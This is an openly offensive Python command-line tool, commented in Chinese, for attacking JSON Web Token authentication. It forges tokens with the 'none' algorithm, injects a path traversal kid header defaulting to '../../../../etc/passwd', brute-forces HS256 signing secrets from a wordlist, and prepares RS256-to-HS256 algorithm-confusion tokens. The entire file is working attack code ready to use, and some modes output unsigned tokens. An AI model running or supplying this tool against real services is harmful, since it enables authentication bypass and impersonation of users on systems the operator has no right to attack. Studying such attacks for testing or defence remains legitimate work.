#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""JWT 攻击工具: none 算法 / kid 注入 / HS256 密钥爆破 / RS256->HS256 算法混淆
用法:
  python jwt_attack.py -t <token> --mode kid
  python jwt_attack.py -t <token> --mode none
  python jwt_attack.py -t <token> --mode brute -w wordlist.txt
"""
import argparse, base64, hashlib, hmac, json, re, sys

def b64url_decode(s):
    s = s + "==="[:(4 - len(s) % 4) % 4]
    return base64.urlsafe_b64decode(s)

def b64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def decode_jwt(token):
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("非 JWT 格式")
    header = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))
    sig = parts[2]
    return header, payload, parts[0], parts[1], sig

def none_attack(token):
    h, p, h64, p64, sig = decode_jwt(token)
    new = f"{h64}.{p64}."
    print(f"[*] 原始算法: {h.get('alg','?')} | 新算法: none")
    new_h = json.loads(b64url_decode(h64))
    new_h["alg"] = "none"
    new_h64 = b64url_encode(json.dumps(new_h, separators=(",", ":")).encode())
    forged = f"{new_h64}.{p64}."
    print(f"[+] 伪造 JWT: {forged}")
    return forged

def kid_injection(token, kid_value="../../../../etc/passwd"):
    h, p, h64, p64, sig = decode_jwt(token)
    print(f"[*] 原始 kid: {h.get('kid','无')} | 注入: {kid_value}")
    new_h = json.loads(b64url_decode(h64))
    new_h["kid"] = kid_value
    new_h64 = b64url_encode(json.dumps(new_h, separators=(",", ":")).encode())
    print(f"[+] 头部: {new_h}")
    # 以 none 算法生成
    forged = f"{new_h64}.{p64}."
    print(f"[+] 伪造 JWT: {forged}")
    return forged

def hs256_sign(data, key):
    return hmac.new(key.encode() if isinstance(key, str) else key,
                    data.encode(), hashlib.sha256).digest()

def brute_hs256(token, wordlist):
    h, p, h64, p64, sig_orig = decode_jwt(token)
    data = f"{h64}.{p64}"
    sig_bytes = b64url_decode(sig_orig)
    print(f"[*] 爆破模式: HS256 | 载荷: {json.dumps(p)[:100]}")
    with open(wordlist, encoding="utf-8", errors="ignore") as f:
        for i, line in enumerate(f, 1):
            key = line.strip()
            if not key:
                continue
            test_sig = hs256_sign(data, key)
            if test_sig == sig_bytes:
                print(f"\n[+] 密钥找到: {key} (第 {i} 行)")
                return key
            if i % 10000 == 0:
                print(f"    ...尝试 {i} 条", end="\r")
    print(f"\n[-] 未找到密钥 ({i} 条)")
    return None

def alg_confusion(token):
    h, p, h64, p64, sig = decode_jwt(token)
    alg = h.get("alg", "")
    if "RS" in alg or "ES" in alg:
        new_h = json.loads(b64url_decode(h64))
        new_h["alg"] = "HS256"
        new_h64 = b64url_encode(json.dumps(new_h, separators=(",", ":")).encode())
        print(f"[*] 算法混淆: {alg} -> HS256")
        print(f"[*] 新头部: {new_h}")
        print(f"[*] 需要使用服务器的公钥作为 HS256 密钥手动签名: {new_h64}.{p64}")
        return f"{new_h64}.{p64}."
    print("[*] 目标算法非 RS/ES, 不适用")

def main():
    ap = argparse.ArgumentParser(description="JWT 攻击工具")
    ap.add_argument("-t", "--token", required=True, help="JWT 令牌")
    ap.add_argument("-m", "--mode", required=True, choices=["none","kid","brute","alg"],
                    help="none(无算法)/kid(kid注入)/brute(HS256爆破)/alg(算法混淆)")
    ap.add_argument("-w", "--wordlist", help="爆破字典(仅brute模式)")
    ap.add_argument("-k", "--kid", default="../../../../etc/passwd", help="kid 注入值")
    args = ap.parse_args()

    if args.mode == "none":
        none_attack(args.token)
    elif args.mode == "kid":
        kid_injection(args.token, args.kid)
    elif args.mode == "brute":
        if not args.wordlist:
            print("[!] --wordlist 必需")
            sys.exit(1)
        brute_hs256(args.token, args.wordlist)
    elif args.mode == "alg":
        alg_confusion(args.token)

if __name__ == "__main__":
    main()
